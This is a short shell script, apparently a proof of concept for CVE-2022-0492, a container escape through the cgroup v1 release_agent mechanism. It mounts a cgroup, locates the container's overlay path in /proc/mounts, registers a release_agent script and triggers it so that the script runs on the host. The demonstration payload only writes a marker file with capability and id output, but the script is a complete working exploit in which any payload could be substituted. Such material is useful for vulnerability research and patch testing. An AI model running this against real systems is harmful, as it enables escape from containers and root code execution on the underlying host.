mount -t cgroup -o rdma cgroup /mnt/
d=/mnt

# Create a sub-cgroup that will notify when no more pids are there.
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /proc/mounts`

# Here we register a release_agent that will be called when there are no pids in the new cgroup
echo $t/c >$d/release_agent

# This is the script that will be executed
# Note it will create a file: /cve-2022-0492
# And should leave a process runnning: sleep 123456
printf '#!/bin/sh\ntouch /cve-2022-0492; /usr/sbin/capsh --print >> /cve-2022-0492; echo "" >> /cve-2022-0492; echo Running as id: $(id) >> /cve-2022-0492 ; sleep 123456' >/c;
chmod +x /c

# Trigger no pids in the cgroup, so the release_agent is executed
sh -c "echo 0 >$d/w/cgroup.procs"
